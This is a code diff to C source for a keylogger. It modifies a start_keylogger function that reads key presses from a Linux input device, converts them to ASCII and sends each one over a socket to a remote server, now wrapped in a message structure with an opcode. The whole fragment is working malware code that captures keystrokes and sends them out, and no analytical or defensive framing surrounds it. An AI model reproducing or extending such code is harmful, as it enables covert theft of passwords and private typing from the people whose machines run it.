@@ -7,6 +7,8 @@
 #include <arpa/inet.h>
 #include <string.h>
 #include "keylog.h"  // Include the header file
+#include "messageManager.h"
+#include "utils.h"
 
 typedef struct {
     int key_code;
@@ -63,14 +65,18 @@ void start_keylogger(int sock, const char *device_path) {
             perror("Read error");
             break;
         }
-        
+        //printf("Ev.type=%d\n", ev.type);
         if (ev.type == EV_KEY) {  
             //printf("Key event: code=%d, value=%d\n", ev.code, ev.value);
             if (ev.value == 1) {  
                 snprintf(buffer, sizeof(buffer), "%s", xt_to_ascii(ev.code));
-                //printf("Sending: %s\n", buffer);
-                send(sock, buffer, strlen(buffer), 0);  // Send key event to server
-                fflush(NULL);
+                printf("Sending: %s\n", buffer);
+                message_t msg;
+                strcpy(msg.buffer, buffer);
+                msg.opCode='K';
+                msg.size=strlen(buffer);
+                send_message(sock, &msg);
+                printf("Value sent\n");
             }
         }
     }
